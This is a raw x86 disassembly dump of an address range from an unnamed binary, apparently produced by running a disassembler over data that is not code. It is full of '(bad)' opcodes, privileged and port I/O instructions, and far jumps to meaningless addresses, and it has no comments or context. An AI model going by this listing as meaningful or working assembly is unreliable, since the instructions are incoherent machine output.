  4188c8:	jae    0x418863
  4188ca:	popa   
  4188cb:	(bad)  
  4188cc:	fisubr DWORD PTR [esi+0x756cadc0]
  4188d2:	cmp    DWORD PTR [ebx],0x13c99fc6
  4188d8:	mov    ebx,cs
  4188da:	dec    esi
  4188db:	test   DWORD PTR [edx*4+0x68d434d2],esp
  4188e2:	pop    edi
  4188e3:	iret   
  4188e4:	inc    eax
  4188e5:	sbb    eax,0xf516b544
  4188ea:	add    al,dl
  4188ec:	cmp    BYTE PTR [ecx],al
  4188ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ef:	mov    esi,esp
  4188f1:	sbb    eax,0x3352a185
  4188f6:	add    DWORD PTR [edi+edx*4],esi
  4188f9:	test   al,0x1f
  4188fb:	aad    0x38
  4188fd:	cwde   
  4188fe:	into   
  4188ff:	popa   
  418900:	mov    eax,ds:0x92182af4
  418905:	mov    ecx,0x121a6046
  41890a:	and    eax,DWORD PTR [edi]
  41890c:	or     DWORD PTR [eax+0xf],esp
  41890f:	pop    es
  418910:	push   0xffffffcf
  418912:	inc    ebp
  418913:	sbb    DWORD PTR [ebx+eax*4+0x28f785b6],eax
  41891a:	cmp    ah,BYTE PTR ds:0xcc9ac637
  418920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418921:	aad    0x46
  418923:	mov    BYTE PTR [ebx+0x35],dh
  418926:	into   
  418927:	mov    ebp,0x5661be45
  41892c:	mov    edi,0xe2a54726
  418931:	outs   dx,BYTE PTR ds:[esi]
  418932:	and    eax,0xea9217f8
  418937:	or     ch,BYTE PTR [ebx]
  418939:	push   ecx
  41893a:	loopne 0x41898c
  41893c:	test   eax,0x5c950c5
  418941:	pop    esp
  418942:	dec    esi
  418943:	xchg   esp,eax
  418944:	imul   eax,DWORD PTR [ebx+0x60],0x52d07340
  41894b:	enter  0xccaf,0xc
  41894f:	pop    ebx
  418950:	in     al,dx
  418951:	sub    eax,0xb9deebe5
  418956:	or     DWORD PTR [ebp+0x2e],ebp
  418959:	cmp    al,0x76
  41895b:	sub    BYTE PTR [esi+0x9],bh
  41895e:	jns    0x418925
  418960:	ds dec esi
  418962:	fist   DWORD PTR [eax]
  418964:	adc    ah,BYTE PTR [ebx-0x4465012]
  41896a:	cmp    BYTE PTR [eax-0x6d35171f],0x79
  418971:	in     al,dx
  418972:	cmc    
  418973:	call   0x8449dd26
  418978:	mov    al,0xd5
  41897a:	pop    edx
  41897b:	cmp    ah,bh
  41897d:	iret   
  41897e:	push   0xfffffffd
  418980:	lds    ecx,FWORD PTR [edx]
  418982:	gs dec ebx
  418984:	sub    eax,0x9d20635f
  418989:	xchg   DWORD PTR [ebx-0x52],ecx
  41898c:	lock mov esi,0xa8ca1a83
  418992:	push   es
  418993:	inc    DWORD PTR [ebp+ebx*2+0x9a1fd14]
  41899a:	fisub  DWORD PTR [edi+esi*2-0x6c4ca6a9]
  4189a1:	pop    es
  4189a2:	fist   DWORD PTR [edi]
  4189a4:	pop    ecx
  4189a5:	mov    eax,ds:0xc2cd4820
  4189aa:	outs   dx,DWORD PTR ds:[esi]
  4189ab:	push   ss
  4189ac:	push   0xc9eee8dd
  4189b1:	lods   eax,DWORD PTR ds:[esi]
  4189b2:	sbb    eax,esi
  4189b4:	or     ch,0xfe
  4189b7:	dec    eax
  4189b8:	cmc    
  4189b9:	inc    ecx
  4189ba:	jmp    DWORD PTR [ecx-0x3f]
  4189bd:	jle    0x4189d4
  4189bf:	and    edi,DWORD PTR [edi]
  4189c1:	sub    dh,BYTE PTR [ebx]
  4189c3:	sub    al,0x31
  4189c5:	ret    
  4189c6:	inc    ebp
  4189c7:	adc    BYTE PTR [edx+ecx*2-0x7b],ch
  4189cb:	(bad)  
  4189cc:	sub    BYTE PTR [ecx+0x2e],dl
  4189cf:	and    bl,dh
  4189d1:	dec    edi
  4189d2:	stos   BYTE PTR es:[edi],al
  4189d3:	inc    eax
  4189d4:	jge    0x4189cc
  4189d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d7:	adc    al,0x21
  4189d9:	dec    ecx
  4189da:	dec    ebx
  4189db:	rol    BYTE PTR [esi+eax*1-0xf4e461d],1
  4189e2:	pop    ebx
  4189e3:	fimul  WORD PTR [edx]
  4189e5:	mov    edi,0xc82de9ea
  4189ea:	and    eax,0x840aa9d5
  4189ef:	ffreep st(3)
  4189f1:	lods   al,BYTE PTR ds:[esi]
  4189f2:	mov    bh,0xf2
  4189f4:	mov    bl,0xbc
  4189f6:	adc    al,0xb4
  4189f8:	xchg   esi,eax
  4189f9:	mov    eax,ds:0x3230d2a1
  4189fe:	cli    
  4189ff:	mov    WORD PTR [ecx-0x6d768f9c],fs
  418a05:	jecxz  0x418a3b
  418a07:	mov    eax,0x98575e99
  418a0c:	outs   dx,BYTE PTR fs:[esi]
  418a0e:	cld    
  418a0f:	lods   eax,DWORD PTR ds:[esi]
  418a10:	cwde   
  418a11:	sbb    eax,DWORD PTR [edx-0x33]
  418a14:	xor    al,0xa3
  418a17:	pop    edi
  418a18:	loopne 0x418a0d
  418a1a:	pop    edx
  418a1b:	inc    BYTE PTR [ebp+0x36]
  418a1e:	mov    WORD PTR [ecx],ss
  418a20:	lds    edx,FWORD PTR [ebx-0x51]
  418a23:	addr16 aas 
  418a25:	inc    eax
  418a26:	or     BYTE PTR [ebp-0x4750c333],bl
  418a2c:	clc    
  418a2d:	out    0x94,al
  418a2f:	mov    bh,0x88
  418a31:	in     al,0x64
  418a33:	xchg   edx,eax
  418a34:	fsub   QWORD PTR [esi+ebx*2-0x4256cae9]
  418a3b:	lods   eax,DWORD PTR ds:[esi]
  418a3c:	and    al,0x19
  418a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a3f:	adc    bh,dl
  418a41:	jbe    0x418a3c
  418a43:	les    esp,FWORD PTR [ebx+edi*4+0x1c022727]
  418a4a:	add    DWORD PTR [edi],edi
  418a4c:	mov    ebx,0x2fc1a6cd
  418a51:	adc    DWORD PTR [ecx+esi*4+0x19],esp
  418a55:	push   esp
  418a56:	inc    esp
  418a57:	sub    al,0x15
  418a59:	int3   
  418a5a:	jg     0x418a20
  418a5c:	jno    0x4189f4
  418a5e:	or     eax,0x974692a3
  418a63:	sub    eax,0x15a10a9f
  418a68:	and    eax,0x1b64fc78
  418a6d:	xlat   BYTE PTR ds:[ebx]
  418a6e:	jmp    0xac02b233
  418a73:	jge    0x418ad8
  418a75:	xor    edi,DWORD PTR ds:0x3984347
  418a7b:	pop    ebp
  418a7c:	lods   eax,DWORD PTR ds:[esi]
  418a7d:	xchg   edx,eax
  418a7e:	(bad)  
  418a7f:	adc    ebp,edx
  418a81:	cli    
  418a82:	cmp    al,0xb3
  418a84:	sahf   
  418a85:	out    0xa5,eax
  418a87:	aaa    
  418a88:	or     DWORD PTR [ebx],0xffffff8b
  418a8b:	xor    al,0x4a
  418a8d:	mov    cx,WORD PTR [ebp-0x229174f0]
  418a94:	test   al,0x8e
  418a96:	sub    eax,0x43fcb6e4
  418a9b:	test   al,0xd9
  418a9d:	and    ecx,DWORD PTR [esi+0x22f9bbc4]
  418aa3:	sbb    BYTE PTR [edi*4-0x299dff38],dh
  418aaa:	mov    edi,0xe9f3cab6
  418aaf:	sub    al,0xa4
  418ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab2:	imul   esp,DWORD PTR [edi],0x8a227106
  418ab8:	in     eax,0x5
  418aba:	pop    edi
  418abb:	into   
  418abc:	lock data16 jl 0x418ab9
  418ac0:	mov    edi,DWORD PTR [edx+0x3d39acf3]
  418ac6:	sub    ecx,ecx
  418ac8:	imul   esp,DWORD PTR [ecx],0x56c8b48d
  418ace:	ja     0x418a5c
  418ad0:	mov    al,ds:0x4b45498d
  418ad5:	ret    
  418ad6:	cli    
  418ad7:	int3   
  418ad8:	dec    edx
  418ad9:	push   edi
  418ada:	push   eax
  418adb:	mov    dh,0x1d
  418add:	sub    DWORD PTR [ebp+0x716fba84],ecx
  418ae3:	xor    bh,BYTE PTR [eax+0x3c8caa8d]
  418ae9:	cmp    al,BYTE PTR ds:[ebx+0x67eab1d7]
  418af0:	call   0xae187bda
  418af5:	ins    BYTE PTR es:[edi],dx
  418af6:	or     DWORD PTR [edx+0x2a],ecx
  418af9:	loopne 0x418b2b
  418afb:	popf   
  418afc:	dec    ebp
  418afd:	cmp    BYTE PTR [edx+edi*4+0x5087bb5a],0x78
  418b05:	sbb    al,0x31
  418b07:	xor    al,0x6c
  418b09:	sub    al,0x96
  418b0b:	aam    0x9b
  418b0d:	rcl    esp,1
  418b0f:	outs   dx,BYTE PTR ds:[esi]
  418b10:	xchg   DWORD PTR [eax-0x676405c5],edi
  418b16:	mov    eax,0x864e650b
  418b1b:	xor    eax,0x6ac6b3d3
  418b20:	inc    ebp
  418b21:	add    eax,0xbd6610b7
  418b26:	out    0xf5,al
  418b28:	and    DWORD PTR [ecx+0x705dcdc5],esp
  418b2e:	push   edx
  418b2f:	lea    edi,[edi+0x31340031]
  418b35:	or     BYTE PTR [esi+0x71c08ab2],dl
  418b3b:	xchg   ah,bh
  418b3d:	jmp    0x7658:0xe0dc158b
  418b44:	mov    dl,0xff
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	jmp    0x418be3
  418b64:	les    ebp,FWORD PTR [edx+edx*1-0x3d]
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	pop    es
  418b6f:	cmp    ah,bl
  418b71:	imul   esi
  418b73:	pop    esi
  418b74:	push   eax
  418b75:	pop    ecx
  418b76:	dec    ebp
  418b77:	mov    ds:0xb294a2aa,eax
  418b7c:	ds pushf 
  418b7e:	stos   DWORD PTR es:[edi],eax
  418b7f:	xor    eax,0xabeaff52
  418b84:	sub    eax,0xffd7f350
  418b89:	arpl   WORD PTR [edx+0xd],bx
  418b8c:	retf   
  418b8d:	in     eax,dx
  418b8e:	mov    ds,WORD PTR [eax-0x791aa3b3]
  418b94:	or     ebx,DWORD PTR [ecx-0x5cb3d3c4]
  418b9a:	daa    
  418b9b:	mov    esp,0xdc504b0a
  418ba0:	test   eax,0x2ebb64f2
  418ba5:	clc    
  418ba6:	lods   al,BYTE PTR ds:[esi]
  418ba7:	and    ebx,DWORD PTR [edx+0x6]
  418baa:	adc    al,0x2b
  418bac:	mov    edx,0x432d2c67
  418bb1:	and    al,0x9b
  418bb3:	mov    eax,ds:0x461c7baa
  418bb8:	cs clc 
  418bba:	in     al,dx
  418bbb:	pusha  
  418bbc:	jbe    0x418b4d
  418bbe:	aaa    
  418bbf:	push   es
  418bc0:	js     0x418bee
  418bc2:	jo     0x418bda
  418bc4:	push   ebp
  418bc5:	pop    ebp
  418bc6:	daa    
  418bc7:	or     al,0x24
  418bc9:	jno    0x418b5d
  418bcb:	call   0xce9b:0x2dc97306
  418bd2:	imul   eax,DWORD PTR [esi+0x7df5a280],0xffffff86
  418bd9:	aas    
  418bda:	adc    ecx,ecx
  418bdc:	dec    ebx
  418bdd:	pop    ecx
  418bde:	call   0x178d4aeb
  418be3:	retf   0xdcb5
  418be6:	fist   WORD PTR [esi+edi*4]
  418be9:	outs   dx,BYTE PTR ds:[esi]
  418bea:	fwait
  418beb:	cmp    esp,DWORD PTR [edx]
  418bed:	mov    edx,0x2c16423d
  418bf2:	adc    al,dl
  418bf4:	fiadd  WORD PTR [ecx+esi*1+0x72fc636]
  418bfb:	arpl   WORD PTR [eax-0x964838c],ax
  418c01:	fdivr  DWORD PTR [ebx-0x12788eaa]
  418c07:	cs out 0xeb,al
  418c0a:	pop    ds
  418c0b:	xchg   BYTE PTR [ecx+ebx*4-0x7b],ch
  418c0f:	adc    ch,BYTE PTR [eax]
  418c11:	cmp    eax,0xfe28fdd6
  418c16:	ret    0xc8e5
  418c19:	xor    bh,BYTE PTR [edi-0x5fc1740f]
  418c1f:	cmp    ch,bl
  418c21:	aaa    
  418c22:	mov    ebx,0xf7d55aa0
  418c27:	xchg   DWORD PTR [esi],edx
  418c29:	aaa    
  418c2a:	aad    0x98
  418c2c:	xchg   esp,eax
  418c2d:	or     esi,0x72b543f6
  418c33:	sbb    DWORD PTR [ebp+esi*2-0x4311d191],ecx
  418c3a:	sbb    esp,DWORD PTR [ecx+0x320765c7]
  418c40:	jbe    0x418be3
  418c42:	pop    edx
  418c43:	cli    
  418c44:	call   0x68087e92
  418c49:	xchg   ecx,eax
  418c4a:	inc    ebp
  418c4b:	and    BYTE PTR [ebx],cl
  418c4d:	jge    0x418c66
  418c4f:	mov    ecx,0xd946d3aa
  418c54:	jmp    0x2217e0a8
  418c59:	or     esp,DWORD PTR [esi-0x4b8cf99a]
  418c5f:	or     esp,DWORD PTR [esi-0x564bf01]
  418c65:	jae    0x418c86
  418c67:	xor    BYTE PTR [ebx-0x65],bl
  418c6a:	or     ch,BYTE PTR [esi]
  418c6c:	xchg   ecx,eax
  418c6d:	pop    ds
  418c6e:	loopne 0x418c45
  418c70:	pop    es
  418c71:	mov    dl,0xf5
  418c73:	or     eax,0x87801592
  418c78:	ficomp DWORD PTR ds:0xd223cc45
  418c7e:	sbb    BYTE PTR [edi+0x67],dh
  418c81:	or     ebp,DWORD PTR [edi]
  418c83:	xor    ecx,DWORD PTR [edi+0x52]
  418c86:	xor    eax,0x24e7d5cf
  418c8b:	dec    esp
  418c8c:	pop    eax
  418c8d:	icebp  
  418c8e:	lahf   
  418c8f:	fs push edi
  418c91:	sbb    DWORD PTR [ecx+0x3047e280],eax
  418c97:	fs cdq 
  418c99:	jmp    0x418c4b
  418c9b:	mov    dh,0xde
  418c9d:	push   0xffffffaf
  418c9f:	mov    edi,0xa87a070a
  418ca4:	rcr    BYTE PTR [esi+0x53],0xc8
  418ca8:	add    eax,0x97a1a635
  418cad:	sub    DWORD PTR [esp+esi*8-0x9],ebp
  418cb1:	adc    BYTE PTR ds:0xaec9b61d,dl
  418cb7:	rol    BYTE PTR [edx],cl
  418cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cba:	wrmsr  
  418cbc:	sub    BYTE PTR [edx-0x21],bh
  418cbf:	call   0x8feffb08
  418cc4:	xchg   edx,eax
  418cc5:	mov    dh,0xa9
  418cc7:	sub    edi,eax
  418cc9:	pop    esi
  418cca:	pop    esi
  418ccb:	retf   0xba4
  418cce:	addr16 lock mov bh,0xa4
  418cd2:	jbe    0x418cd9
  418cd4:	push   edi
  418cd5:	in     al,dx
  418cd6:	xlat   BYTE PTR ds:[ebx]
  418cd7:	(bad)  
  418cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cd9:	test   BYTE PTR ds:[ebx+0x49572666],ah
  418ce0:	adc    al,BYTE PTR ds:0x6a7ea862
  418ce6:	call   0x16b9763a
  418ceb:	popa   
  418cec:	shl    DWORD PTR [edx-0x2a14cc4b],1
  418cf2:	retf   
  418cf3:	inc    eax
  418cf4:	and    bl,bh
  418cf6:	(bad)  
  418cf7:	xchg   edi,eax
  418cf8:	mov    cl,0x94
  418cfa:	aam    0x4b
  418cfc:	xchg   esp,eax
  418cfd:	popf   
  418cfe:	mov    edx,0x69013afc
  418d03:	pop    esi
  418d04:	push   0xd563f7dc
  418d09:	gs add al,0xd1
  418d0c:	xchg   ebx,eax
  418d0d:	mov    al,0x9b
  418d0f:	sbb    edx,ebp
  418d11:	xor    BYTE PTR [ecx-0x5c],ch
  418d14:	cs call 0x9671:0x571e5f55
  418d1c:	sub    DWORD PTR [ebx],edx
  418d1e:	mov    WORD PTR [edi-0x12],fs
  418d21:	or     ebx,ebp
  418d23:	mov    dh,0x79
  418d25:	arpl   WORD PTR [ecx+0x66b016ad],di
  418d2b:	cdq    
  418d2c:	aad    0x1e
  418d2e:	cmp    BYTE PTR [ebx-0x52fbacba],ah
  418d34:	rcr    BYTE PTR [eax+esi*2],cl
  418d37:	div    DWORD PTR [ebx+0x3c]
  418d3a:	enter  0xfe0e,0x30
  418d3e:	jmp    0xbe8:0xd971b144
  418d45:	rcl    BYTE PTR [esi],1
  418d47:	je     0x418d28
  418d49:	jnp    0x418d7d
  418d4b:	les    ebp,FWORD PTR [eax-0x19e4ae01]
  418d51:	cld    
  418d52:	pop    edx
  418d53:	stc    
  418d54:	mov    edi,0x3e5fb63
  418d59:	inc    esp
  418d5a:	or     edx,0x5156d0d3
  418d60:	add    BYTE PTR [esp+edi*8],al
  418d63:	in     al,0x93
  418d65:	sub    BYTE PTR [ebx-0x14810ea0],bh
  418d6b:	jmp    0x58f6883b
  418d70:	dec    ecx
  418d71:	jne    0x418d4d
  418d73:	fsubr  DWORD PTR [ebp+0x26]
  418d76:	xchg   esp,eax
  418d77:	inc    ebp
  418d78:	push   ds
  418d79:	mov    al,0x25
  418d7b:	cli    
  418d7c:	outs   dx,DWORD PTR ds:[esi]
  418d7d:	sbb    al,0x3
  418d7f:	add    bl,ch
  418d81:	pop    es
  418d82:	aas    
  418d83:	add    ah,BYTE PTR [ecx-0x14]
  418d86:	mov    eax,0xf2742b32
  418d8b:	leave  
  418d8c:	sub    al,0x6a
  418d8e:	xor    bh,BYTE PTR [ecx+edx*2]
  418d91:	mov    ebp,ss
  418d93:	aam    0x94
  418d95:	jmp    0x418d7a
  418d97:	jecxz  0x418df2
  418d99:	call   0x7596:0x17b6e137
  418da0:	cmp    edx,DWORD PTR [eax+0x20]
  418da3:	push   edi
  418da4:	rcr    edx,1
  418da6:	in     al,0x35
  418da8:	int    0xdb
  418daa:	jbe    0x418def
  418dac:	rol    DWORD PTR [edi-0x64906f56],cl
  418db2:	jecxz  0x418d6d
  418db4:	dec    ecx
  418db5:	push   ecx
  418db6:	pop    ebp
  418db7:	xor    DWORD PTR [ecx-0x78],esp
  418dba:	mov    edx,0x1ad6a73a
  418dbf:	hlt    
  418dc0:	sbb    ebp,ecx
  418dc2:	ss int3 
  418dc4:	data16 mov al,gs:0x43de562d
  418dcb:	cwde   
  418dcc:	mov    al,0xd5
  418dce:	fdivr  DWORD PTR [eax]
  418dd0:	or     eax,0x3c74ab61
  418dd5:	dec    edx
  418dd6:	mov    al,0x5e
  418dd8:	ffreep st(7)
  418dda:	std    
  418ddb:	mov    eax,?
  418ddd:	xchg   esp,eax
  418dde:	jbe    0x418e01
  418de0:	xor    DWORD PTR [ecx],ecx
  418de2:	or     al,dl
  418de4:	mov    edi,0x4609262a
  418de9:	mov    ecx,0xf49dd422
  418dee:	test   BYTE PTR [ebp+0xc],bh
  418df1:	(bad)  
  418df2:	jmp    0x102d68e9
  418df7:	bswap  edi
  418df9:	jne    0x418def
  418dfb:	add    al,0x75
  418dfd:	add    BYTE PTR [ebp+ebx*8-0x5d18f744],0x6b
  418e05:	out    0xba,al
  418e07:	test   bh,ah
  418e09:	ss (bad) 
  418e0b:	dec    edx
  418e0c:	xchg   edx,eax
  418e0d:	xor    eax,0x3b87bae4
  418e12:	xchg   ebp,eax
  418e13:	adc    DWORD PTR [ecx+0x10],ecx
  418e16:	jne    0x418e69
  418e18:	arpl   sp,di
  418e1a:	rol    DWORD PTR [edi-0x513affa4],0x46
  418e21:	add    al,dh
  418e23:	dec    edx
  418e24:	dec    ebx
  418e25:	outs   dx,DWORD PTR ds:[esi]
  418e26:	push   ebp
  418e27:	mov    DWORD PTR ds:0x10fd4bbe,eax
  418e2d:	in     al,0x8
  418e2f:	mov    cl,bh
  418e31:	add    eax,0x10ffd017
  418e36:	lds    ecx,FWORD PTR [ecx+0x21]
  418e39:	xor    cl,cl
  418e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3c:	cwde   
  418e3d:	sbb    al,0x13
  418e3f:	inc    ecx
  418e40:	scas   eax,DWORD PTR es:[edi]
  418e41:	in     eax,dx
  418e42:	xor    al,0x56
  418e44:	mov    edx,0x9e2eefc6
  418e49:	jmp    0x418ead
  418e4b:	(bad)  
  418e4c:	jbe    0x418eac
  418e4e:	pop    ebp
  418e4f:	jmp    0xa9a7:0xb25ae242
  418e56:	xchg   ecx,eax
  418e57:	push   ds
  418e58:	or     dh,ah
  418e5a:	xor    eax,0x31cfa1d4
  418e5f:	add    eax,0x54f1203c
  418e64:	adc    eax,0x1c6e35d7
  418e69:	xchg   esi,eax
  418e6a:	push   DWORD PTR [bx+si]
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	jb     0x418e8b
  418e83:	fsub   DWORD PTR [ecx+0xd]
  418e86:	sar    BYTE PTR [edi+0x78],0x7b
  418e8a:	jle    0x418f04
  418e8c:	js     0x418e6e
  418e8e:	sbb    al,0x8c
  418e90:	lea    esi,[esi+0x60aea0c2]
  418e96:	jb     0x418ef3
  418e98:	mov    esp,0x9fce4347
  418e9d:	retf   0x49e4
  418ea0:	push   0xffffffdc
  418ea2:	in     eax,0x2a
  418ea4:	mov    DWORD PTR [ecx+0x38],ecx
  418ea7:	mov    esi,0xb95a2747
  418eac:	add    DWORD PTR [edi-0x21],0xffffff9a
  418eb0:	iret   
  418eb1:	mov    esp,0xe6a877ac
  418eb6:	jmp    0x85df40d9
  418ebb:	lock add al,0x30
  418ebe:	retf   0xb12c
  418ec1:	rcr    BYTE PTR [edx+0x7984f3af],0x62
  418ec8:	and    ch,BYTE PTR [edx]
  418eca:	sub    ah,BYTE PTR [ebx]
  418ecc:	out    0x9e,eax
  418ece:	push   edx
  418ecf:	jecxz  0x418efd
  418ed1:	cmp    al,BYTE PTR [eax+edi*4-0x5b]
  418ed5:	add    eax,0x23958731
  418eda:	js     0x418ed8
  418edc:	in     al,dx
  418edd:	and    edi,DWORD PTR [ecx-0x50]
  418ee0:	pop    ebp
  418ee1:	sub    BYTE PTR [eax],cl
  418ee3:	and    edx,0x32
  418ee6:	ficomp DWORD PTR [esp+ebx*8+0x59]
  418eea:	lea    edi,[ecx]
  418eec:	adc    dh,bl
  418eee:	xchg   ecx,eax
  418eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ef0:	jbe    0x418f1a
  418ef2:	add    eax,0x34ae1412
  418ef7:	sahf   
  418ef8:	call   0x7340:0x5eef10f
  418eff:	out    0xae,eax
  418f01:	sti    
  418f02:	and    bh,bl
  418f04:	stos   DWORD PTR es:[edi],eax
  418f05:	inc    ebx
  418f06:	add    esi,ecx
  418f08:	loopne 0x418f6e
  418f0a:	fmul   st(4),st
  418f0c:	js     0x418f61
  418f0e:	into   
  418f0f:	adc    dl,BYTE PTR [ebx]
  418f11:	in     eax,0x5a
  418f13:	jne    0x418f14
  418f15:	inc    eax
  418f16:	sbb    cl,BYTE PTR [esi]
  418f18:	cdq    
  418f19:	scas   al,BYTE PTR es:[edi]
  418f1a:	out    dx,eax
  418f1b:	fsubr  QWORD PTR fs:[ebx+0x41]
  418f1f:	hlt    
  418f20:	sub    al,0x1e
  418f22:	lahf   
  418f23:	push   ds
  418f24:	call   0x8dc2:0xc0ff5a7d
  418f2b:	mov    eax,0x10441f9f
  418f30:	push   esi
  418f31:	imul   ebx,DWORD PTR ds:[eax],0xf2f88623
  418f38:	cdq    
  418f39:	dec    eax
  418f3a:	xchg   edx,eax
  418f3b:	inc    ebp
  418f3c:	mov    DWORD PTR [edx-0x71],ecx
  418f3f:	mov    dh,BYTE PTR ds:0xafb6a6ee
  418f45:	out    dx,eax
  418f46:	jae    0x418f2c
  418f48:	dec    ebp
  418f49:	lock addr16 mov ds:0xf031,eax
  418f4e:	repnz adc eax,0x88d01b22
  418f54:	retf   
  418f55:	mov    ch,0x10
  418f57:	sbb    DWORD PTR ds:0xffcdcf71,esi
  418f5d:	xchg   bh,dl
  418f5f:	sbb    cl,BYTE PTR [edi+0x21]
  418f62:	pop    ss
  418f63:	(bad)  
  418f64:	fidiv  DWORD PTR [ebx]
  418f66:	(bad)  
  418f69:	scas   al,BYTE PTR es:[edi]
  418f6a:	add    edi,edi
  418f6c:	bnd jmp 0x418fad
  418f6f:	or     al,0xa1
  418f71:	into   
  418f72:	sub    dh,bh
  418f74:	jb     0x418f8f
  418f76:	call   0xfe64:0x73c29a52
  418f7d:	mov    dh,0x35
  418f7f:	cmp    edx,DWORD PTR [ecx+0x5331153]
  418f85:	adc    eax,0xffffff8a
  418f88:	(bad)  
  418f89:	out    0xd3,eax
  418f8b:	xor    DWORD PTR [edx+ebx*8+0x5b],ecx
  418f8f:	mov    dh,BYTE PTR [ebp+0x6555f3cf]
  418f95:	mov    ah,0x99
  418f97:	mov    ebx,0x8c5327fb
  418f9c:	cli    
  418f9d:	mov    bh,0x94
  418f9f:	mov    bh,0xb4
  418fa1:	adc    DWORD PTR [ebx-0x5c],0xffffffef
  418fa5:	xchg   BYTE PTR [eax+0x128908b3],al
  418fab:	pop    ecx
  418fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fad:	dec    edi
  418fae:	out    0xdb,al
  418fb0:	stos   DWORD PTR es:[edi],eax
  418fb1:	xchg   ecx,eax
  418fb2:	es pop es
  418fb4:	in     eax,dx
  418fb5:	hlt    
  418fb6:	mov    dh,0xf3
  418fb8:	in     al,0xa5
  418fba:	cmp    cl,bl
  418fbc:	stos   BYTE PTR es:[edi],al
  418fbd:	(bad)  
  418fbe:	fisub  WORD PTR [ebp+0x4cd65534]
  418fc4:	lds    ecx,FWORD PTR [ebx-0x59]
  418fc7:	push   eax
  418fc8:	ja     0x418fcf
  418fca:	sub    BYTE PTR [eax-0x6d7c4397],dl
  418fd0:	xchg   edx,eax
  418fd1:	scas   eax,DWORD PTR es:[edi]
  418fd2:	fcmove st,st(3)
  418fd4:	jmp    0xe7e0:0x48329bd9
  418fdb:	loopne 0x418fd3
  418fdd:	sbb    DWORD PTR [ebx+0x2337e5d2],0x9ba10288
  418fe7:	fld    TBYTE PTR [edi+0xf]
  418fea:	test   al,0x2a
  418fec:	xor    ebx,DWORD PTR [esi+0x20e1d295]
  418ff2:	push   esp
  418ff3:	int    0x22
  418ff5:	ja     0x418fdf
  418ff7:	adc    ch,BYTE PTR [eax]
  418ff9:	in     al,0x48
  418ffb:	pop    eax
  418ffc:	sub    DWORD PTR [ecx+edx*1-0x11],edx
  419000:	push   ebp
  419001:	sub    al,0x70
  419003:	dec    eax
  419004:	pop    ds
  419005:	xchg   esp,eax
  419006:	fidivr WORD PTR [esp+eiz*8+0x453181c1]
  41900d:	lods   al,BYTE PTR ds:[esi]
  41900e:	(bad)  
  419010:	enter  0xaf13,0x3d
  419014:	inc    edi
  419015:	int    0x30
  419017:	and    BYTE PTR [edi],0xbd
  41901a:	cs mov ebp,0xe728b1f0
  419020:	jb     0x418fa4
  419022:	adc    DWORD PTR [edx+0x7117a535],esi
  419028:	and    eax,DWORD PTR [ebp-0x218a472a]
  41902e:	mov    edx,0x41cd9a6f
  419033:	mov    cl,0x75
  419035:	int3   
  419036:	sub    ah,BYTE PTR [edi+0x74744e21]
  41903c:	mov    al,0x3b
  41903e:	cmp    BYTE PTR [esi+0x419e4c90],ch
  419044:	mov    bl,0x9c
  419046:	sub    DWORD PTR [eax+0x6eb44394],0xffffffa8
  41904d:	js     0x418ff6
  41904f:	rcr    BYTE PTR [edx+0x4abd8316],1
  419055:	ja     0x419083
  419057:	or     al,0x23
  419059:	fst    st(0)
  41905b:	addr16 out 0xe,eax
  41905e:	fs nop
  419060:	push   edi
  419061:	pop    ecx
  419062:	xor    dh,BYTE PTR [ecx]
  419064:	lods   al,BYTE PTR ds:[esi]
  419065:	mov    cl,0x13
  419067:	jmp    0xa19a2932
  41906c:	lods   eax,DWORD PTR ds:[esi]
  41906d:	push   ds
  41906e:	sahf   
  41906f:	retf   0x5ef9
  419072:	or     bl,BYTE PTR [edi]
  419074:	lds    edx,FWORD PTR [esi+0x40]
  419077:	adc    esi,DWORD PTR [eax+0x144a8bf0]
  41907d:	in     al,0x23
  41907f:	arpl   WORD PTR [edx+0x2a6437b9],dx
  419085:	dec    eax
  419086:	in     al,0x13
  419088:	rol    BYTE PTR [edx],0x8c
  41908b:	push   ebx
  41908c:	stc    
  41908d:	fucomi st,st(3)
  41908f:	mov    dh,0x3
  419091:	stos   DWORD PTR es:[edi],eax
  419092:	cmp    ebp,DWORD PTR [ebp-0x11]
  419095:	shr    BYTE PTR [ebx+esi*1+0xf16e4b4],1
  41909c:	sbb    BYTE PTR [edx-0x3d796f10],0xf1
  4190a3:	sbb    bl,BYTE PTR [eax-0x39]
  4190a6:	mov    dl,0x83
  4190a8:	sub    BYTE PTR [ebp+0x2c],ch
  4190ab:	sti    
  4190ac:	lods   al,BYTE PTR ds:[esi]
  4190ad:	xchg   ebx,eax
  4190ae:	mov    al,ds:0xb56fc54a
  4190b3:	jnp    0x419077
  4190b5:	lds    ebx,FWORD PTR [ebx-0x50]
  4190b8:	fsubr  DWORD PTR [eax-0x41]
  4190bb:	lea    esi,[esi+0x5bb52dc8]
  4190c1:	inc    esi
  4190c2:	lods   al,BYTE PTR ds:[esi]
  4190c3:	popa   
  4190c4:	xchg   esp,eax
  4190c5:	xor    eax,0x270326a1
  4190ca:	inc    eax
  4190cb:	sbb    eax,0xf5f953b2
  4190d0:	pop    edi
  4190d1:	jno    0x419081
